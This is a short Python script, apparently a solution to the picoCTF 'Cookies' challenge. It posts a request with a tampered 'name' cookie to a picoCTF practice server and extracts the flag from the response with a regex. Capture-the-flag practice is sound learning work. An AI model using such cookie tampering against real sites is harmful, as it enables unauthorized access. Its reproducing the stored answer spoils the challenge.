# Jacob Hammargren
# picoCTF Automation
# level: Cookies

import requests
import re

def run():
    url = 'http://mercury.picoctf.net:29649/search'
    cookies = {'name' : '18'}
    data = requests.post(url, cookies=cookies).text
    flag = re.findall('(?=picoCTF).*}', data)
    return flag[0]
